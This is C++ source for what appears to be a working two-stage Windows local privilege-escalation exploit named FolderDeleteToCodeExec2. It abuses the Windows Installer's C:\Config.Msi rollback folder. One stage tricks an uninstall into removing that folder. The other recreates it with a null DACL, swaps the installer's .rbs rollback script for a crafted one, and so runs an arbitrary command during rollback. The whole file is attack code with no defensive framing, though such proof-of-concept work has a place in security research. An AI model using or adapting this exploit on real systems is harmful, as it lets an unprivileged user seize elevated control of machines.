#pragma comment(lib, "Msi.lib")

#include <Windows.h>
#include <AclAPI.h>
#include <Msi.h>

#include <wil/filesystem.h>
#include <wil/result.h>
#include <wil/stl.h>

#include <algorithm>
#include <exception>
#include <filesystem>
#include <format>
#include <fstream>
#include <iostream>
#include <string_view>
#include <string>
#include <thread>
#include <vector>

#include "resource.h"

using namespace std::string_literals;

import offwinlib;

static void print_usage()
{
	std::wcout << L"Usage:" << std::endl;
	std::wcout << L"\tStage 1: FolderDeleteToCodeExec2.exe 1" << std::endl;
	std::wcout << L"\tStage 2: FolderDeleteToCodeExec2.exe 2 COMMAND" << std::endl;
}

static void start_installer(const std::wstring& msi_path, const std::wstring& command)
{
	MsiSetInternalUI(INSTALLUILEVEL_NONE, nullptr);
	MsiInstallProductW(msi_path.c_str(), command.c_str());
}

static std::wstring extract_installer()
{
	auto msi_path = std::wstring{std::filesystem::temp_directory_path()} + owl::misc::generate_uuid() + L".msi";
	std::wcout << std::format(L"[*] Extracting installer to {}...", msi_path) << std::endl;
	auto msi_data = owl::misc::get_resource(IDR_RCDATA1);
	std::ofstream msi_file{msi_path, std::ios::binary};
	msi_file.write(reinterpret_cast<const char*>(msi_data.data()), msi_data.size());
	msi_file.close();
	std::wcout << L"[+] Installer extracted." << std::endl;
	return msi_path;
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		std::vector<std::wstring_view> args(argv, argv + argc);
		if (args.size() < 2)
		{
			print_usage();
			return 1;
		}

		const auto& stage = args[1];

		if (stage == L"1")
		{
			auto msi_path = extract_installer();

			auto dummy_file_folder = std::wstring{std::filesystem::temp_directory_path()} + owl::misc::generate_uuid();
			auto dummy_file_path = dummy_file_folder + LR"(\a)";
			std::wcout << std::format(L"[*] Installing dummy file {}...", dummy_file_path) << std::endl;
			MsiSetInternalUI(INSTALLUILEVEL_NONE, nullptr);
			THROW_IF_WIN32_ERROR(MsiInstallProductW(msi_path.c_str(), (L"INSTALLFOLDER=" + dummy_file_folder).c_str()));
			std::wcout << L"[+] Installation complete." << std::endl;

			std::wcout << L"[*] Opening a handle to the dummy file with share mode set..." << std::endl;
			auto dummy_file = wil::open_file(dummy_file_path.c_str(), FILE_READ_ATTRIBUTES, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE);
			std::wcout << L"[+] Handle opened." << std::endl;

			wil::unique_event primary_continue;
			auto primary_continue_name = owl::misc::generate_uuid();
			primary_continue.create(wil::EventOptions::None, primary_continue_name.c_str());
			wil::unique_event msi_continue;
			auto msi_continue_name = owl::misc::generate_uuid();
			msi_continue.create(wil::EventOptions::None, msi_continue_name.c_str());
			std::wcout << L"[*] Starting uninstaller..." << std::endl;
			auto installer_thread = std::jthread{start_installer, msi_path, std::format(L"REMOVE=ALL EVENTPRIMARY={} EVENTMSI={}", primary_continue_name, msi_continue_name)};
			std::wcout << L"[+] Uninstallation started." << std::endl;

			std::wcout << LR"([*] Waiting for installer to signal that the dummy file has been moved to C:\Config.Msi...)" << std::endl;
			THROW_WIN32_IF(WAIT_TIMEOUT, !primary_continue.wait(10000));
			std::wcout << L"[+] Signal received." << std::endl;

			std::wcout << L"[*] Reopening dummy file handle without share mode set..." << std::endl;
			auto dummy_file_path_new = wil::GetFinalPathNameByHandleW<std::wstring>(dummy_file.get());
			dummy_file.reset();
			auto dummy_file_new = wil::open_file(dummy_file_path_new.c_str(), DELETE, 0, FILE_FLAG_DELETE_ON_CLOSE);
			std::wcout << std::format(L"[+] Reopened handle to {}...", dummy_file_path_new) << std::endl;

			std::wcout << L"[*] Signaling installer to continue..." << std::endl;
			msi_continue.SetEvent();
			installer_thread.join();
			std::wcout << L"[+] Uninstallation complete." << std::endl;

			std::wcout << L"[*] Deleting dummy file and installer..." << std::endl;
			dummy_file_new.reset();
			std::filesystem::remove(msi_path);
			std::wcout << L"[+] Files deleted." << std::endl;
		}
		else if (stage == L"2")
		{
			if (args.size() < 3)
			{
				print_usage();
				return 1;
			}

			const auto& command = args[2];

			auto installer_folder_path = LR"(C:\Config.Msi)"s;
			std::wcout << std::format(L"[*] Creating {} with a weak DACL...", installer_folder_path) << std::endl;
			SECURITY_DESCRIPTOR sd;
			THROW_IF_WIN32_BOOL_FALSE(InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION));
			THROW_IF_WIN32_BOOL_FALSE(SetSecurityDescriptorDacl(&sd, true, nullptr, false));
			SECURITY_ATTRIBUTES sec_att
			{
				.nLength = sizeof(SECURITY_ATTRIBUTES),
				.lpSecurityDescriptor = &sd,
				.bInheritHandle = false
			};
			THROW_IF_WIN32_BOOL_FALSE(CreateDirectoryW(installer_folder_path.c_str(), &sec_att));
			auto installer_folder = wil::open_file(installer_folder_path.c_str(), READ_CONTROL | WRITE_DAC, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_FLAG_BACKUP_SEMANTICS);
			std::wcout << L"[+] Folder created and handle obtained." << std::endl;

			auto msi_path = extract_installer();

			wil::unique_event primary_continue;
			auto primary_continue_name = owl::misc::generate_uuid();
			primary_continue.create(wil::EventOptions::None, primary_continue_name.c_str());
			wil::unique_event msi_continue;
			auto msi_continue_name = owl::misc::generate_uuid();
			msi_continue.create(wil::EventOptions::None, msi_continue_name.c_str());
			std::wcout << L"[*] Starting installer..." << std::endl;
			auto installer_thread = std::jthread{start_installer, msi_path, std::format(L"EVENTPRIMARY={} EVENTMSI={} ERROROUT=1", primary_continue_name, msi_continue_name)};
			std::wcout << L"[+] Installation started." << std::endl;

			std::wcout << L"[*] Waiting for installer to signal that RBS file has been prepared..." << std::endl;
			THROW_WIN32_IF(WAIT_TIMEOUT, !primary_continue.wait(10000));
			std::wcout << L"[+] Signal received." << std::endl;

			std::wcout << std::format(L"[*] Reapplying weak DACL to {}...", installer_folder_path) << std::endl;
			THROW_IF_WIN32_ERROR(SetSecurityInfo(installer_folder.get(), SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, nullptr, nullptr, nullptr, nullptr));
			std::wcout << L"[+] DACL applied." << std::endl;

			std::wcout << L"[*] Overwriting RBS file..." << std::endl;
			auto folder_iterator = std::filesystem::directory_iterator{installer_folder_path};
			auto rbs_path = std::ranges::find_if(folder_iterator, [](const auto& dir_entry) { return dir_entry.path().extension() == L".rbs"; });
			THROW_WIN32_IF(ERROR_FILE_NOT_FOUND, rbs_path == std::ranges::cend(folder_iterator));
			auto rbs = owl::misc::build_rbs(L"Whatever", command);
			THROW_IF_WIN32_BOOL_FALSE(DeleteFile(rbs_path->path().c_str()));
			std::ofstream rbs_file{rbs_path->path(), std::ios::binary};
			rbs_file.write(reinterpret_cast<const char*>(rbs.data()), rbs.size());
			rbs_file.close();
			std::wcout << std::format(L"[+] RBS file overwritten: {}...", rbs_path->path().wstring()) << std::endl;

			std::wcout << L"[*] Signaling installer to continue..." << std::endl;
			msi_continue.SetEvent();
			installer_thread.join();
			std::wcout << L"[+] Rollback complete." << std::endl;

			std::wcout << L"[*] Deleting installer..." << std::endl;
			std::filesystem::remove(msi_path);
			std::wcout << L"[+] File deleted." << std::endl;
		}
	}
	catch (const std::exception& e)
	{
		std::wcout << L"[-] " << e.what() << std::endl;
		return 1;
	}

	return 0;
}
